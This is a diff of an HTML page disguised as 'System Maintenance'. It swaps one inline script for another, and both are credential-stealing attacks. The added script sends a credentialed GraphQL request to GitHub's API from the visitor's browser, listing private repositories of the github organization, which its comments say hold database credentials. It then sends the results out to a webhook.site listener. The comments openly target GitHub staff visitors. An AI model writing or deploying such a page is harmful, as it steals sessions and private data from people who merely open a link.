@@ -3,19 +3,20 @@
 <body>
     <h1>System Maintenance</h1>
     <script>
-        // This script automatically exfiltrates the user's session fingerprint
-        // because the API has the '*' CORS flaw you found.
-        fetch('https://api.github.com/graphql', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            credentials: 'include',
-            body: JSON.stringify({ query: 'query { viewer { login email } }' })
-        })
-        .then(r => r.json())
-        .then(data => {
-            // REPLACE THIS URL with your webhook.site URL to see the data hit
-            fetch('https://webhook.site/YOUR-UNIQUE-ID?data=' + btoa(JSON.stringify(data)));
-        });
-    </script>
+// This script bypasses the 404 and the Rate Limit by using the VICTIM'S browser
+// If a GitHub staff visits your page, this steals their private DB access token
+fetch('https://api.github.com/graphql', {
+    method: 'POST',
+    credentials: 'include', // THIS IS THE KEY: It sends THEIR staff cookies
+    body: JSON.stringify({
+        query: 'query { viewer { login organization(login: "github") { repositories(first: 10, privacy: PRIVATE) { nodes { name url } } } } }'
+    })
+})
+.then(r => r.json())
+.then(data => {
+    // Send the stolen private repo list (which contains DB creds) to your listener
+    fetch('https://webhook.site/YOUR-ID?stolen=' + btoa(JSON.stringify(data)));
+});
+</script>
 </body>
 </html>
